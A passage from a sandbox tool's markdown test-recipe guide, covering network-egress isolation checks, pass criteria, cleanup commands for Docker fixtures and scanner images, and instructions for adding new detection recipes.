# inside the sandbox shell:
npm start                              # → "blocked EAI_AGAIN" (NOT a 200)
exit

# egress still toggles on demand:
$SB net on .
$SB exec . -- node -e "require('http').get('http://example.com',r=>console.log('now',r.statusCode))"  # → now 200
$SB net off .
```

**Pass criteria:**

- `docker network inspect sandbox-proxy --format '{{.Internal}}'` prints `true`.
- `npm start` inside the sandbox **fails** (`EAI_AGAIN` / no `200`) despite the port being exposed.
- `sandbox net on` still grants egress (200), `net off` revokes it.
- Proxy routing is unaffected (see 5.5 round-trip — Traefik reaches the container over the internal `sandbox-proxy`).

**Cleanup:**

```sh
$SB nuke /tmp/sb-egress -y 2>/dev/null
rm -rf /tmp/sb-egress
```

### Cleanup (Phase 6 compose)

```sh
$SB nuke /tmp/sb-deps -y 2>/dev/null
$SB nuke /tmp/sb-no-compose -y 2>/dev/null
$SB nuke /tmp/sb-multi -y 2>/dev/null
rm -rf /tmp/sb-deps /tmp/sb-no-compose /tmp/sb-multi
```

---

## Cleanup checklist

After running Live recipes, anything you `sandbox run` lives in Docker. Clean up:

```sh
$SB ps --all                            # see what's around
$SB nuke /tmp/sb-<name> -y              # per project
rm -rf /tmp/sb-*                        # fixtures themselves

# To drop the scanner DB volume too (rebuilds on next --update-db):
docker volume rm sandbox-scanner-db

# To drop the scanner image (rebuilds on next opt-in):
docker rmi sandbox/scanner:latest
```

---

## Adding a recipe

When you add a new check (YARA rule, heuristic, compose audit, exit code, profile, etc.):

1. Add a section here with a fixture that triggers it and one that doesn't.
2. Cite the rule_id in full so a future search lands here.
3. Link to the relevant ADR or threat-model section that motivates it.
4. Reference the recipe in your PR's "Test plan" instead of restating it inline.

The aim is that a contributor — human or AI — can answer "does feature X actually work?" in under a minute, just by following one section of this file.

## See also

- [`threat-model.md`](threat-model.md) — what each notch defends against
- [`srs.md`](srs.md) — exit codes and flag semantics
- [`usage-flow.md`](usage-flow.md) — the trust-dial flow as a user story
- [`adrs/`](adrs/) — the design decisions each recipe validates
